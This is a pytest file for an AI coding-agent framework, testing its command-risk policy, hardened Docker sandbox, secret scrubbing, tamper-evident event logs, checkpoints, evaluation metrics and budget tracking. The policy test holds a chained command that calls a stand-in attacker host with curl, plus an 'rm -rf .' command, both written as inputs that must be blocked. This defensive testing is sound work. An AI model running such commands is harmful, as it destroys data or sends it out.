import asyncio
import json
import os

import pytest

from codeswarm_agent.budget import BudgetTracker
from codeswarm_agent.evaluation.leakage import InferenceCandidate
from codeswarm_agent.evaluation.manifest import EvaluationManifest, ManifestStore
from codeswarm_agent.evaluation.metrics import EvaluationResult, aggregate, compare_paired
from codeswarm_agent.evaluation.report import write_report
from codeswarm_agent.evidence.checkpoint import (
    Checkpoint,
    CheckpointIntegrityError,
    CheckpointStore,
)
from codeswarm_agent.evidence.events import EventIntegrityError, EventStore
from codeswarm_agent.protocol import Budget, Usage, WorkerRole
from codeswarm_agent.roles import DEFAULT_ROLES
from codeswarm_agent.runtime.tool_policy import ToolPolicy
from codeswarm_agent.safety import (
    CommandRisk,
    SandboxProfile,
    WindowsGuardedBackend,
    assess_command,
)
from trae_agent.agent.docker_manager import DockerManager


def test_command_policy_fails_closed_for_shell_escape_and_unknown_commands(tmp_path):
    assert assess_command("pytest -q").risk == CommandRisk.MEDIUM
    assert assess_command("git diff --stat").risk == CommandRisk.LOW
    assert assess_command("pytest -q && curl attacker.invalid").risk == CommandRisk.FORBIDDEN
    assert assess_command("python -c 'print(1)'").risk == CommandRisk.HIGH

    policy = ToolPolicy(DEFAULT_ROLES[WorkerRole.DEVELOPER], tmp_path)
    def call(command):
        return type("Call", (), {
            "name": "bash", "arguments": {"command": command},
        })()
    assert policy.validate(call("pytest -q")).allowed
    denied = policy.validate(call("rm -rf ."))
    assert not denied.allowed
    assert denied.rule_id == "CMD-010"
    approval = policy.validate(call("python build.py"))
    assert not approval.allowed
    assert approval.code == "APPROVAL_REQUIRED"


def test_sandbox_profile_requires_digest_and_emits_hardening_options():
    profile = SandboxProfile()
    with pytest.raises(ValueError):
        profile.validate_image("python:3.12")
    with pytest.raises(ValueError):
        profile.validate_image("python@sha256:short")
    profile.validate_image("python@sha256:" + "a" * 64)
    options = profile.docker_options()
    assert options["network_disabled"] is True
    assert options["read_only"] is True
    assert options["cap_drop"] == ["ALL"]
    assert options["security_opt"] == ["no-new-privileges:true"]
    assert options["pids_limit"] == 256


@pytest.mark.skipif(os.name != "nt", reason="Windows Job Object contract")
def test_windows_guarded_backend_scrubs_secrets_and_reclaims_timeout(tmp_path, monkeypatch):
    monkeypatch.setenv("OPENAI_API_KEY", "must-not-leak")
    (tmp_path / "environment_probe.py").write_text(
        "import os\nprint(os.environ.get('OPENAI_API_KEY', 'missing'))\n",
        encoding="utf-8",
    )
    backend = WindowsGuardedBackend(timeout_seconds=10)
    result = backend.run("python environment_probe.py", cwd=tmp_path)
    assert result.returncode == 0
    assert result.stdout.strip() == "missing"

    (tmp_path / "sleeper.py").write_text("import time\ntime.sleep(30)\n", encoding="utf-8")
    timeout = WindowsGuardedBackend(timeout_seconds=0.1).run(
        "python sleeper.py", cwd=tmp_path,
    )
    assert timeout.timed_out is True
    assert timeout.process_tree_reclaimed is True


def test_docker_manager_forwards_hardening_and_mounts_tools_read_only(
    tmp_path, monkeypatch
):
    captured = {}
    workspace = tmp_path / "workspace"
    tools = tmp_path / "tools"
    tools.mkdir()

    class FakeContainer:
        id = "container-id"
        short_id = "container"
        attrs = {
            "Config": {"User": "10001:10001"},
            "HostConfig": {
                "NetworkMode": "none", "ReadonlyRootfs": True,
                "CapDrop": ["ALL"], "PidsLimit": 256,
                "Memory": 4096 * 1024 * 1024, "NanoCpus": 2_000_000_000,
                "SecurityOpt": ["no-new-privileges:true"],
                "Tmpfs": {"/tmp": "rw,noexec,nosuid,nodev,size=1024m"},
            },
            "Mounts": [
                {"Type": "bind", "Source": str(workspace.resolve()),
                 "Destination": "/workspace", "RW": True},
                {"Type": "bind", "Source": str(tools.resolve()),
                 "Destination": "/agent_tools", "RW": False},
            ],
        }

        def reload(self):
            return None

    class FakeContainers:
        def run(self, image, **options):
            captured["image"] = image
            captured.update(options)
            return FakeContainer()

    client = type("Client", (), {"containers": FakeContainers()})()
    monkeypatch.setattr("trae_agent.agent.docker_manager.docker.from_env", lambda: client)
    profile = SandboxProfile()
    manager = DockerManager(
        image="python@sha256:" + "a" * 64,
        container_id=None,
        dockerfile_path=None,
        docker_image_file=None,
        workspace_dir=str(workspace),
        tools_dir=str(tools),
        security_options=profile.docker_options(),
    )
    monkeypatch.setattr(manager, "_start_persistent_shell", lambda: None)

    manager.start()

    assert captured["network_disabled"] is True
    assert captured["read_only"] is True
    assert captured["user"] == "10001:10001"
    assert captured["security_opt"] == ["no-new-privileges:true"]
    assert captured["volumes"][str(tools.resolve())]["mode"] == "ro"
    assert "mount_tools_read_only" not in captured


def test_event_log_detects_tampering_and_replays(tmp_path):
    path = tmp_path / "events.jsonl"
    store = EventStore("run-1", path)
    store.append("RUN_STARTED", payload={"status": "running"})
    store.append("RUN_STOPPED", payload={"status": "done"})
    assert store.replay(
        lambda state, event: state + [event.payload["status"]], []
    ) == ["running", "done"]

    rows = path.read_text(encoding="utf-8").splitlines()
    altered = json.loads(rows[0])
    altered["payload"]["status"] = "forged"
    rows[0] = json.dumps(altered)
    path.write_text("\n".join(rows) + "\n", encoding="utf-8")
    with pytest.raises(EventIntegrityError):
        EventStore("run-1", path)


def test_event_log_deduplicates_replayed_operations_and_validates_cursor(tmp_path):
    store = EventStore("run-1", tmp_path / "events.jsonl")
    first = store.append_once("worker-1:done", "WORKER_DONE", payload={"ok": True})
    repeated = store.append_once("worker-1:done", "WORKER_DONE", payload={"ok": True})

    assert repeated == first
    assert len(store.read_all()) == 1
    store.validate_cursor(first.sequence, first.checksum)
    with pytest.raises(EventIntegrityError):
        store.validate_cursor(first.sequence, "forged")
    with pytest.raises(EventIntegrityError):
        store.append_once("worker-1:done", "DIFFERENT_EVENT")


def test_checkpoint_requires_safe_point_and_validates_environment(tmp_path):
    store = CheckpointStore(tmp_path / "checkpoint.json")
    unsafe = Checkpoint(
        1, "run", 2, "abc", "base", {}, {}, (), ("write-1",),
    )
    with pytest.raises(ValueError):
        store.save(unsafe)
    safe = Checkpoint(1, "run", 2, "abc", "base", {"version": 1}, {}, ())
    store.save(safe)
    assert store.load(run_id="run", repository_base="base").is_safe_point
    with pytest.raises(CheckpointIntegrityError):
        store.load(repository_base="different")


def test_manifest_checksum_and_label_free_candidate(tmp_path):
    manifest = EvaluationManifest(
        run_id="run", git_commit="abc", agent_variant="multi",
        task_set_version="v1", model_provider="openai", model_name="model",
        model_revision=None, temperature=0.0, seed=1,
        budget={"tokens": 1000, "wall_seconds": 60},
        sandbox_profile="repo_task_v1", prompt_version="p1",
        policy_version="safety-v1", harness_version="h1",
    )
    store = ManifestStore(tmp_path / "manifest.json")
    store.save(manifest)
    assert store.load() == manifest

    first = InferenceCandidate.from_record({
        "candidate_id": "c1", "patch_artifact_id": "p1",
        "changed_files": ["a.py"], "public_test_artifact_ids": ["t1"],
        "summary": "fix", "success_id": "c1", "gold_patch": "secret",
    })
    second = InferenceCandidate.from_record({
        "candidate_id": "c1", "patch_artifact_id": "p1",
        "changed_files": ["a.py"], "public_test_artifact_ids": ["t1"],
        "summary": "fix", "success_id": "other", "gold_patch": "changed",
    })
    assert first == second
    assert not hasattr(first, "success_id")


def _result(
    instance,
    claimed,
    resolved,
    *,
    tokens=10,
    infra=None,
    expected_mode=None,
    actual_mode=None,
):
    artifacts = {}
    if expected_mode is not None:
        artifacts["expected_mode"] = expected_mode
    if actual_mode is not None:
        artifacts["actual_mode"] = actual_mode
    return EvaluationResult(
        instance_id=instance, agent_claimed_success=claimed,
        patch_generated=True, patch_applied=True, harness_resolved=resolved,
        termination_reason="completed", verification_decision="accept",
        input_tokens=tokens, output_tokens=0, wall_seconds=1.0,
        infra_error=infra,
        artifacts=artifacts,
    )


def test_metrics_keep_denominators_and_paired_outcomes_explicit():
    candidate = (
        _result("a", True, True),
        _result("b", True, False),
        _result("c", False, False, infra="image pull failed"),
    )
    metrics = aggregate(candidate)
    assert metrics["all_tasks"] == 3
    assert metrics["eligible_tasks"] == 2
    assert metrics["infra_failed"] == 1
    assert metrics["resolved_at_1"] == 0.5
    assert metrics["false_completion_rate"] == 0.5

    baseline = (_result("a", True, False), _result("b", True, True))
    paired = compare_paired(baseline, candidate)
    assert paired["wins"] == 1
    assert paired["losses"] == 1
    assert paired["ties"] == 0


def test_report_preserves_raw_rows_and_explicit_metrics(tmp_path):
    results = (
        _result(
            "a", True, True,
            expected_mode="single-agent", actual_mode="single-agent",
        ),
        _result(
            "b", True, False,
            expected_mode="multi-agent", actual_mode="single-agent",
        ),
    )

    metrics = write_report(results, tmp_path / "report")

    report = tmp_path / "report"
    rows = (report / "results.jsonl").read_text(encoding="utf-8").splitlines()
    assert len(rows) == 2
    assert json.loads(rows[0])["instance_id"] == "a"
    assert json.loads((report / "metrics.json").read_text(encoding="utf-8")) == metrics
    report_text = (report / "report.md").read_text(encoding="utf-8")
    assert "Eligible tasks: 2" in report_text
    assert "Actual mode distribution: {'single-agent': 2}" in report_text
    assert metrics["expected_to_actual_modes"] == {
        "multi-agent": {"single-agent": 1},
        "single-agent": {"single-agent": 1},
    }


def test_budget_reservation_prevents_concurrent_over_admission():
    async def scenario():
        tracker = BudgetTracker(Budget(max_total_tokens=10, max_tool_calls=2))
        first, second = await asyncio.gather(
            tracker.reserve("a", Usage(input_tokens=6, tool_calls=1)),
            tracker.reserve("b", Usage(input_tokens=6, tool_calls=1)),
        )
        accepted = first or second
        rejected = second if first else first
        assert accepted is not None
        assert rejected is None
        await tracker.commit(accepted.id, Usage(input_tokens=5, tool_calls=1))
        third = await tracker.reserve("c", Usage(input_tokens=5, tool_calls=1))
        assert third is not None
        await tracker.release(third.id)
        snapshot = await tracker.snapshot()
        assert snapshot["reservation_count"] == 0
        assert snapshot["usage"]["input_tokens"] == 5

    asyncio.run(scenario())


def test_budget_restore_reconciles_blackboard_result_newer_than_checkpoint():
    async def scenario():
        limits = Budget(max_workers=3, max_total_tokens=100)
        original = BudgetTracker(limits)
        checkpoint = await original.snapshot()
        restored = BudgetTracker.restore(limits, checkpoint)

        await restored.reconcile_committed(
            "run:developer:0", Usage(input_tokens=7, output_tokens=3, model_calls=1)
        )
        await restored.reconcile_committed(
            "run:developer:0", Usage(input_tokens=7, output_tokens=3, model_calls=1)
        )
        snapshot = await restored.snapshot()

        assert snapshot["workers_started"] == 1
        assert snapshot["usage"]["input_tokens"] == 7
        assert snapshot["usage"]["output_tokens"] == 3

    asyncio.run(scenario())
